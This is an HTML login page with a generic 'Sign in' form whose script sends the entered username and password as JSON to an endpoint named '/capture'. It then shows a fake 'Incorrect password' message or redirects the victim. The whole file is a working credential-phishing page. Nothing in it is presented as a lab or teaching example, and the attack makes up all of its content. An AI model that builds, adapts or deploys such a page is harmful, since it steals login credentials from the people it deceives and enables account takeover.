<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
  <div class="card">
    <h1>Sign in</h1>
    <p class="sub">to continue</p>
    <form id="f">
      <input name="user" type="text" placeholder="Email or username" required autofocus>
      <input name="pass" type="password" placeholder="Password" required>
      <button type="submit">Continue</button>
    </form>
    <p id="msg"></p>
  </div>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const fd = new FormData(e.target);
  const r = await fetch('/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user: fd.get('user'), pass: fd.get('pass') })
  });
  const j = await r.json().catch(() => ({}));
  if (j.redirect) { window.location = j.redirect; return; }
  document.getElementById('msg').textContent = 'Incorrect password. Try again.';
  e.target.reset();
});
</script>
</body>
</html>
